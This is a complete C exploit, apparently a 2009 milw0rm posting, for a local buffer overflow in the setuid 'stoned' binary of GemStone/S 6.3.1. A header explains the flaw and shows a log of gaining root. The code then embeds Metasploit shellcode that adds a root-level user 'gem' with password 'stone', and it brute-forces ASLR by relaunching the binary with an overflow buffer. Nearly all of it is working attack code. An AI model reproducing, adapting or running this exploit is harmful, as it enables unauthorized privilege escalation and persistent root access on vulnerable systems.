@@ -1,0 +1,137 @@
+/*
+wonderfulcaricatureofexploitability.c
+AKA
+GemStone/S 6.3.1 "stoned" Local Buffer Overflow Exploit
+
+Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 09.07.2009
+
+*********************************************************************************************************
+Gemstone/S "stoned" suffers from a local buffer overflow when parsing input either from the "-e" or "-l"
+flags, which allows a user to specify an exe config file and logfile, respectively. Both use the same
+buffer that is overflowed and we can overwrite the instruction pointer to control the flow of "stoned".
+
+GemStone/S 6.3.1 (GemStone-Linux_NC-631.zip) binaries use libstdc++.so.5 which means they were compiled
+with GCC <= 3.3.x and do not have GCC 4.x protections in place as they probably would by default if we
+compiled them from source or used packages. We will put our payload in the exploitable buffer this time.
+That being said, we can brute force ASLR on linux and execute arbitrary code pretty confortably.
+
+linux@debian:~$ uname -a && cat /etc/debian_version
+Linux debian 2.6.26-1-486 #1 Sat Jan 10 17:46:23 UTC 2009 i686 GNU/Linux
+5.0
+linux@debian:~$ /sbin/sysctl -A | grep randomize
+.....
+kernel.randomize_va_space = 1
+.....
+linux@debian:~$ ls -al /opt/gemstone/sys/stoned
+-rwsr-xr-x 1 root root 994910 2009-05-26 19:40 /opt/gemstone/sys/stoned
+linux@debian:~$ gcc -o wonderfulcaricatureofexploitability wonderfulcaricatureofexploitability.c
+linux@debian:~$ ./wonderfulcaricatureofexploitability
+
+GemStone/S 6.3.1 "stoned" Local Buffer Overflow Exploit
+
+Brute forcing our return address... please wait.
+
+Hit payload @ 0xbf85b638 -> "su" to gem (stone) for a root shell :)
+
+linux@debian:~$ su gem
+Password: 
+sh-3.2# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-3.2# exit
+exit
+linux@debian:~$
+
+Tested on Debian 5 (Lenny) and Ubuntu 9.04 (Jaunty Jackalope)
+
+Now supposedly "The engineering group has informed me that most or all of the issues you found have been
+fixed in our latest 64-bit release", but it looks like they left the 32-bit release out to dry because it
+has been over 3 months and I haven't got a response back nor do I see any updated version on the website.
+There are more bugs in the GemStone SUID binaries such as format strings and arbitrary file disclosures
+that should be fixed now so maybe they will releases updates, I think some people would appreciate it.
+*********************************************************************************************************
+wonderfulcaricatureofexploitability.c
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <time.h>
+#include <signal.h>
+#include <sys/wait.h>
+
+#define BIN  "/opt/gemstone/sys/stoned"
+#define USER "gem"
+#define PASS "stone"
+
+#define SIZE 8224
+#define CNT  10000
+#define NOP  0x90
+
+/* linux_ia32_adduser -  LSHELL=/bin/sh LUSER=gem LPASS=stone Size=116 Encoder=PexFnstenvSub http://metasploit.com */
+char shellcode[] = "\x2b\xc9\x83\xe9\xe9\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x35"
+                   "\x7f\xe5\x28\x83\xeb\xfc\xe2\xf4\x04\xb6\x6c\xe3\x5f\x39\xbd\xe5"
+                   "\xb5\x15\xe0\x70\x04\xb6\xb4\x40\x46\x0c\x92\x4c\x5d\x50\xca\x58"
+                   "\x54\x17\xca\x4d\x41\x1c\x6c\xcb\x74\xca\xe1\xe5\xb5\xec\x0d\x09"
+                   "\x35\x7f\xe5\x4f\x50\x12\xdf\x69\x74\x0c\xd2\x78\x70\x39\xd0\x47"
+                   "\x7f\x0e\xae\x5b\x0f\x4f\xdf\x18\x0f\x45\xca\x12\x1a\x1d\x8c\x46"
+                   "\x1a\x0c\x8d\x22\x6c\xf4\xb4\xd4\x5f\x7b\xbd\xe5\xb5\x15\xe4\x70"
+                   "\xf8\xff\xe5\x28";
+
+int main(int argc, char *argv[])
+{
+
+char buf[SIZE];
+int i, stat;
+long retaddr;
+pid_t pid;
+struct timeval time;
+
+     printf("\nGemStone/S 6.3.1 \"stoned\" Local Buffer Overflow Exploit\n\n");
+
+     printf("Brute forcing our return address... please wait.\n\n");
+
+for(i = 0; i < CNT; i++)
+{
+
+     gettimeofday(&time, NULL);
+     srand(time.tv_sec ^ time.tv_usec);
+
+retaddr = 0xbf000000 + (rand() & 0x00ffffff); // Jon Oberheide
+
+     memset(buf, 0, sizeof(buf));
+
+     memset(buf, NOP, sizeof(buf));
+     memcpy(buf+SIZE-strlen(shellcode)-4, shellcode, sizeof(shellcode));
+     memcpy(buf+SIZE-4, &retaddr, 4);
+
+buf[SIZE] = '\0';
+
+     fflush(stdout);
+
+pid = fork();
+
+if(pid == 0)
+{
+
+if(execl(BIN, BIN, "-l", buf, NULL) < 0) perror("execl"); // -e is also vulnerable
+
+}
+
+     waitpid(pid, &stat, 0);
+
+if(WIFEXITED(stat))
+{
+
+     printf("Hit payload @ 0x%lx -> \"su\" to %s (%s) for a root shell :)\n\n", retaddr, USER, PASS);
+
+     return 0;
+
+}
+}
+
+     return 0;
+
+}
+
+// milw0rm.com [2009-09-09]
